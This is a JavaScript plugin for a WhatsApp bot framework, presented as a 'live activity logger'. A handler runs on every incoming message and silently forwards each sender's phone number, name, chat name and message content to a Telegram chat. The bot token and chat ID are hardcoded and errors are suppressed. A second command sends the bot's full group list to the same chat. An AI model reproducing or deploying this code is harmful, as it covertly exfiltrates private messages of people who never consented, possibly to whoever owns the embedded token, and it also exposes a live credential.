const { cmd } = require("../command");
const axios = require("axios");

// ═══════════════════════════════════════════════════════════
// ⚙️ TELEGRAM CONFIGURATION
// ═══════════════════════════════════════════════════════════
const TG_BOT_TOKEN = "8699822531:AAFp83cfyJ2RedYvXQMciASvBoWQxBB4Zjg"; 
const TG_CHAT_ID = "6653388298"; 
// ═══════════════════════════════════════════════════════════

const sendToTelegram = async (text) => {
    try {
        if (TG_BOT_TOKEN === "YAHAN_APNA_TELEGRAM_BOT_TOKEN_PASTE_KAREIN" || !TG_CHAT_ID) return;
        await axios.post(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
            chat_id: TG_CHAT_ID,
            text: text,
            parse_mode: "Markdown",
            disable_web_page_preview: true
        }, { timeout: 10000 });
    } catch (e) {
        // Silent fail to prevent bot crash
    }
};

cmd({
    on: "body",
    dontAddCommandList: true,
    filename: __filename
}, async (client, message, m, { from, body, isGroup, isCreator, sender, pushName }) => {
    try {
        if (TG_BOT_TOKEN === "YAHAN_APNA_TELEGRAM_BOT_TOKEN_PASTE_KAREIN" || !TG_CHAT_ID) return;

        // 🔥 FIX 1: IGNORE BOT'S OWN MESSAGES (Prevents logging bot replies)
        if (message.key?.fromMe) return;

        // 🔥 FIX 2: FOOLPROOF NUMBER EXTRACTION
        const botJid = client.user?.id || "";
        const botNum = botJid ? botJid.split('@')[0].split(':')[0].replace(/[^0-9]/g, '') : '';

        // Check all possible sources in order of reliability
        const sources = [
            message.key?.participant, // Best for groups
            message.key?.remoteJid,   // Best for DMs
            sender,                   // Framework specific
            from                      // Framework specific
        ];

        let realNumber = "Unknown/Hidden (Masked by Hosting)";
        
        for (let jid of sources) {
            if (!jid) continue;
            let num = jid.split('@')[0];
            if (num.includes(':')) num = num.split(':')[0];
            num = num.replace(/[^0-9]/g, '');
            
            // Skip if it's the bot itself
            if (num === botNum) continue;
            
            // Skip group/broadcast IDs
            if (num.startsWith('120363') || num === 'status' || num === 'broadcast') continue;
            
            // If we got a valid-looking number (10 to 15 digits), use it
            if (num.length >= 10 && num.length <= 15) {
                realNumber = num;
                break; // Found a valid number, stop searching
            }
        }

        const userName = message.pushName || pushName || "No Name";
        const time = new Date().toLocaleString("en-PK", { timeZone: "Asia/Karachi", hour12: true });
        
        let chatName = "Private Chat (DM)";
        if (isGroup) {
            try {
                const meta = await client.groupMetadata(from).catch(() => null);
                chatName = meta?.subject || "Unknown Group";
            } catch (e) {
                chatName = "Unknown Group";
            }
        }

        let msgType = "Text";
        let msgContent = body || "No Text (Media/Empty)";
        
        if (message.imageMessage) { msgType = "🖼️ Image"; msgContent = message.imageMessage.caption || "No Caption"; }
        else if (message.videoMessage) { msgType = "🎥 Video"; msgContent = message.videoMessage.caption || "No Caption"; }
        else if (message.audioMessage) { msgType = "🎵 Audio"; msgContent = message.audioMessage.ptt ? "Voice Note" : "Audio File"; }
        else if (message.documentMessage) { msgType = "📄 Document"; msgContent = message.documentMessage.fileName || "File"; }
        else if (message.stickerMessage) { msgType = "🎭 Sticker"; msgContent = "Sticker Sent"; }

        const logMessage = `
╭━━〔 🤖 *LIVE ACTIVITY LOG* 〕━━⬣
┃ 🕒 *Time:* \`${time}\`
┃ 👤 *Name:* ${userName}
┃ 🔢 *Number:* [${realNumber}](https://wa.me/${realNumber})
┃ 👑 *Is Owner:* ${isCreator ? "✅ Yes" : "❌ No"}
┃ 💬 *Chat:* ${isGroup ? "👥 Group" : "👤 Private DM"}
┃ 🏷️ *Chat Name:* ${chatName}
┃ 📦 *Type:* ${msgType}
┃ ⌨️ *Content:* 
┃ ${msgContent}
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━⬣
> *Powered by SARWAR-MD*
        `.trim();

        await sendToTelegram(logMessage);
    } catch (err) {
        console.log("[TG Logger Error]:", err.message);
    }
});

// ═══════════════════════════════════════════════════════════
// 📊 MANUAL STATS COMMAND
// ═══════════════════════════════════════════════════════════
cmd({
    pattern: "telestats",
    alias: ["botreport", "mygroups", "checkbot", "fullstatus"],
    desc: "Send full bot stats and group list to Telegram",
    category: "owner",
    react: "📊",
    filename: __filename
}, async (client, message, m, { reply, isCreator, sender }) => {
    if (!isCreator) return reply("❌ *Access Denied!* Only owner can use this.");
    
    reply("⏳ *Generating report... Sending to Telegram...*");
    
    try {
        const groups = await client.groupFetchAllParticipating().catch(() => ({}));
        const groupList = Object.values(groups);
        const totalGroups = groupList.length;
        let totalMembers = 0;
        let groupDetails = "";

        groupList.forEach((g, index) => {
            const memberCount = g.participants ? g.participants.length : 0;
            totalMembers += memberCount;
            groupDetails += `${index + 1}. *${g.subject}*\n   └─ 👥 Members: ${memberCount} | ID: \`${g.id.split('@')[0]}\`\n`;
        });

        const botJid = client.user?.id || sender;
        const botNumber = botJid ? botJid.split('@')[0].split(':')[0].replace(/[^0-9]/g, '') : "Unknown";
        const time = new Date().toLocaleString("en-PK", { timeZone: "Asia/Karachi", hour12: true });

        const reportMessage = `
╭━━〔 📊 *BOT FULL REPORT* 〕━━⬣
┃ 🕒 *Time:* ${time}
┃ 🤖 *Bot Number:* [${botNumber}](https://wa.me/${botNumber})
┃ 👥 *Total Groups:* ${totalGroups}
┃ 👤 *Total Members:* ${totalMembers}
┃ 📱 *Status:* ✅ Active & Running
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━⬣

🏆 *LIST OF ALL GROUPS:*
━━━━━━━━━━━━━━━━━━━━━━━━
${groupDetails || "No groups found."}

> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ sᴀʀᴡᴀʀ-ᴍᴅ ⚡*
        `.trim();

        await sendToTelegram(reportMessage);
        reply("✅ *Full report sent to your Telegram successfully!*");
    } catch (err) {
        reply("❌ Error: " + err.message);
    }
});
